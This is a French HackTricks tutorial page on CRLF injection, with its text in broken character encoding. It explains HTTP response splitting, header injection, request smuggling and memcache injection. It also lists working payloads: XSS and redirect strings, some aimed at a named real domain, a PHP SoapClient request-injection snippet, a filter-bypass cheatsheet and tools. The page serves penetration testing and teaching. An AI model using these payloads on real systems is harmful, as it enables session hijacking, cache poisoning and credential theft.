# Injection CRLF (%0D%0A)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'imp√©n√©trable - **nous recrutons !** (_polonais courant √©crit et parl√© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Qu'est-ce que le CRLF ?

Lorsqu'un navigateur envoie une requ√™te √† un serveur web, le serveur r√©pond avec une r√©ponse contenant √† la fois les en-t√™tes de r√©ponse HTTP et le contenu r√©el du site web, c'est-√†-dire le corps de la r√©ponse. Les en-t√™tes HTTP et la r√©ponse HTML (le contenu du site web) sont s√©par√©s par une combinaison sp√©cifique de caract√®res sp√©ciaux, √† savoir un retour chariot et un saut de ligne. Ils sont √©galement connus sous le nom de CRLF.

Le serveur web utilise le CRLF pour comprendre quand un nouvel en-t√™te HTTP commence et un autre se termine. Le CRLF peut √©galement indiquer √† une application web ou √† un utilisateur qu'une nouvelle ligne commence dans un fichier ou dans un bloc de texte. Les caract√®res CRLF sont un message standard HTTP/1.1, donc utilis√©s par tout type de serveur web, y compris Apache, Microsoft IIS et tous les autres.\
De [https://www.netsparker.com/blog/web-security/crlf-http-header/#](https://www.netsparker.com/blog/web-security/crlf-http-header/)

### Qu'est-ce que la vuln√©rabilit√© d'injection CRLF ?

Dans une attaque exploitant une vuln√©rabilit√© d'injection CRLF, l'attaquant ins√®re √† la fois les caract√®res de retour chariot et de saut de ligne dans les entr√©es utilisateur pour tromper le serveur, l'application web ou l'utilisateur en leur faisant croire qu'un objet est termin√© et qu'un autre a commenc√©. Ainsi, les s√©quences CRLF ne sont pas des caract√®res malveillants, cependant, ils peuvent √™tre utilis√©s √† des fins malveillantes, pour le fractionnement de r√©ponse HTTP, etc.

## Injection CRLF dans les applications web

Dans les applications web, une injection CRLF peut avoir des impacts graves, selon ce que l'application fait avec les √©l√©ments individuels. Les impacts peuvent aller de la divulgation d'informations √† l'ex√©cution de code, une vuln√©rabilit√© directe affectant la s√©curit√© de l'application web. En fait, une attaque par injection CRLF peut avoir des r√©percussions tr√®s s√©rieuses sur une application web, m√™me si elle n'a jamais √©t√© r√©pertori√©e dans la liste du Top 10 de l'OWASP. Par exemple, il est √©galement possible de manipuler des fichiers journaux dans un panneau d'administration comme expliqu√© dans l'exemple ci-dessous.

#### Un exemple d'injection CRLF dans un fichier journal

Imaginez un fichier journal dans un panneau d'administration avec le motif de flux de sortie IP - Heure - Chemin visit√©, comme ci-dessous :
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Si un attaquant parvient √† injecter les caract√®res CRLF dans la requ√™te HTTP, il peut modifier le flux de sortie et falsifier les entr√©es de journal. Il peut changer la r√©ponse de l'application web en quelque chose comme ce qui suit :
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Les %0d et %0a sont les formes encod√©es en URL de CR et LF. Par cons√©quent, les entr√©es de journal ressembleraient √† ceci apr√®s que l'attaquant ait ins√©r√© ces caract√®res et que l'application les affiche :

IP - Heure - Chemin visit√©
```
123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
En exploitant une vuln√©rabilit√© d'injection CRLF, l'attaquant peut falsifier des entr√©es dans le fichier de journalisation pour dissimuler ses propres actions malveillantes. L'attaquant proc√®de litt√©ralement √† un d√©tournement de page et modifie la r√©ponse. Par exemple, imaginez un sc√©nario o√π l'attaquant a le mot de passe administrateur et ex√©cute le param√®tre restrictedaction, qui ne peut √™tre utilis√© que par un administrateur.

Le probl√®me est que si l'administrateur remarque qu'une IP inconnue a utilis√© le param√®tre restrictedaction, il se rendra compte que quelque chose ne va pas. Cependant, puisqu'il semble maintenant que la commande a √©t√© √©mise par le localhost (et donc probablement par quelqu'un qui a acc√®s au serveur, comme un admin), cela ne para√Æt pas suspect.

Toute la partie de la requ√™te commen√ßant par %0d%0a sera trait√©e par le serveur comme un seul param√®tre. Apr√®s cela, il y a un autre & avec le param√®tre restricted action qui sera analys√© par le serveur comme un autre param√®tre. En effet, cela serait la m√™me requ√™te que :
```
/index.php?page=home&restrictedaction=edit
```
### S√©paration de r√©ponse HTTP

#### Description

√âtant donn√© que l'en-t√™te d'une r√©ponse HTTP et son corps sont s√©par√©s par des caract√®res CRLF, un attaquant peut tenter de les injecter. Une combinaison de CRLFCRLF indiquera au navigateur que l'en-t√™te se termine et que le corps commence. Cela signifie qu'il est maintenant capable d'√©crire des donn√©es √† l'int√©rieur du corps de la r√©ponse o√π le code html est stock√©. Cela peut conduire √† une vuln√©rabilit√© de type Cross-site Scripting.

#### Un exemple de S√©paration de r√©ponse HTTP menant √† XSS

Imaginez une application qui d√©finit un en-t√™te personnalis√©, par exemple :
```
X-Your-Name: Bob
```
La valeur de l'en-t√™te est d√©finie via un param√®tre get appel√© "name". Si aucun encodage d'URL n'est en place et que la valeur est directement refl√©t√©e dans l'en-t√™te, il pourrait √™tre possible pour un attaquant d'ins√©rer la combinaison mentionn√©e de CRLFCRLF pour indiquer au navigateur que le corps de la requ√™te commence. De cette mani√®re, il peut ins√©rer des donn√©es telles qu'une charge utile XSS, par exemple :
```
?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
```
L'exemple ci-dessus affichera une fen√™tre d'alerte dans le contexte du domaine attaqu√©.

#### Un exemple de HTTP Response Splitting menant √† une redirection

{% embed url="https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62" %}

Naviguer vers :
```
/%0d%0aLocation:%20http://myweb.com
```
Et le serveur r√©pond avec l'en-t√™te :
```
Location: http://myweb.com
```
**Autre exemple : (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### Dans le chemin de l'URL

Vous pouvez envoyer le payload **dans le chemin de l'URL** pour contr√¥ler la **r√©ponse** du serveur :
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Injection de l'en-t√™te HTTP

#### Description

En exploitant une injection CRLF, un attaquant peut √©galement ins√©rer des en-t√™tes HTTP qui pourraient √™tre utilis√©s pour d√©faire des m√©canismes de s√©curit√© tels que le filtre XSS d'un navigateur ou la politique de m√™me origine (same-origin-policy). Cela permet √† l'attaquant d'obtenir des informations sensibles comme des jetons CSRF. Il peut √©galement d√©finir des cookies qui pourraient √™tre exploit√©s en connectant la victime au compte de l'attaquant ou en exploitant des vuln√©rabilit√©s de scriptage entre sites (XSS) autrement inexploitables.

#### Un exemple d'injection d'en-t√™te HTTP pour extraire des donn√©es sensibles

Si un attaquant peut injecter les en-t√™tes HTTP qui activent CORS (Cross Origin Resource Sharing), il peut utiliser JavaScript pour acc√©der √† des ressources qui sont autrement prot√©g√©es par la SOP (Same Origin Policy), qui emp√™che les sites de diff√©rentes origines d'acc√©der les uns aux autres.

### Nouvelle requ√™te HTTP dans SSRF

En abusant de l'injection CRLF, vous pouvez **cr√©er une nouvelle requ√™te HTTP et l'injecter**.\
Un bon exemple peut √™tre r√©alis√© en utilisant le gadget de d√©s√©rialisation `SoapClient` en PHP. Cette classe est **vuln√©rable au CRLF** √† l'int√©rieur du param√®tre `user_agent`, permettant **d'ins√©rer de nouveaux en-t√™tes et contenu de corps**. Cependant, vous pouvez m√™me √™tre capable d'abuser de cette vuln√©rabilit√© pour **injecter une nouvelle requ√™te HTTP :**
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

#Put a nc listening in port 9090
$client->__soapCall("test", []);
```
### Injection d'en-t√™te pour le Request Smuggling

Vous pouvez injecter des en-t√™tes essentiels pour garantir que **le back-end maintient la connexion ouverte** apr√®s avoir r√©pondu √† la demande initiale :
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Ensuite, **sp√©cifiez une seconde requ√™te**. Ici, vous avez un **smuggling de requ√™te** classique avec des **en-t√™tes/corps suppl√©mentaires** ajout√©s par le serveur apr√®s l'injection.\
Voici deux des nombreuses options pour l'exploitation inter-utilisateurs.

Sp√©cifier un **pr√©fixe malveillant** pour empoisonner soit la requ√™te du prochain utilisateur, soit un cache web :

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

Ou concevoir notre pr√©fixe pour le combiner avec les d√©chets r√©siduels et cr√©er une seconde requ√™te compl√®te afin de d√©clencher l'empoisonnement de la file d'attente des r√©ponses.

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

Pour plus d'informations sur cette technique et les probl√®mes potentiels, [**consultez la source originale**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

### Injection Memcache

Memcache est un **syst√®me de stockage cl√©-valeur qui utilise un protocole en texte clair**. Plus d'infos dans :

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

Si une plateforme prend **des donn√©es d'une requ√™te HTTP et les utilise sans les assainir** pour effectuer des **requ√™tes** vers un serveur **memcache**, un attaquant pourrait abuser de ce comportement pour **injecter de nouvelles commandes memcache**.

Par exemple, dans la vuln√©rabilit√© originellement d√©couverte, les cl√©s de cache √©taient utilis√©es pour retourner l'IP et le port auxquels un utilisateur devrait se connecter, et les attaquants ont pu **injecter des commandes memcache** qui allaient **empoisonner le cache pour envoyer les d√©tails des victimes** (noms d'utilisateur et mots de passe inclus) vers les serveurs de l'attaquant :

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt=""><figcaption></figcaption></figure>

De plus, les chercheurs ont √©galement d√©couvert qu'ils pouvaient d√©synchroniser les r√©ponses memcache pour envoyer l'IP et les ports des attaquants aux utilisateurs dont l'email n'√©tait pas connu de l'attaquant :

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Pour l'information compl√®te, lisez le** [**rapport original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

## Impacts de la vuln√©rabilit√© d'injection CRLF

L'impact des injections CRLF varie et inclut √©galement tous les impacts du Cross-site Scripting jusqu'√† la divulgation d'informations. Cela peut √©galement d√©sactiver certaines restrictions de s√©curit√© comme les filtres XSS et la politique de m√™me origine dans les navigateurs des victimes, les rendant vuln√©rables aux attaques malveillantes.

### Comment pr√©venir les injections CRLF / en-t√™tes HTTP dans les applications web

La meilleure technique de pr√©vention est de ne pas utiliser directement les entr√©es des utilisateurs √† l'int√©rieur des en-t√™tes de r√©ponse. Si cela n'est pas possible, vous devriez toujours utiliser une fonction pour encoder les caract√®res sp√©ciaux CRLF. Une autre bonne pratique de s√©curit√© des applications web est de mettre √† jour votre langage de programmation vers une version qui n'autorise pas l'injection de CR et LF dans les fonctions qui d√©finissent les en-t√™tes HTTP.

### CHEATSHEET
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Outils Automatiques

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Liste de D√©tection par Force Brute

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## R√©f√©rences

* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)

<img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si vous √™tes int√©ress√© par une **carri√®re en hacking** et √† hacker l'inviolable - **nous recrutons !** (_polonais courant √©crit et parl√© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
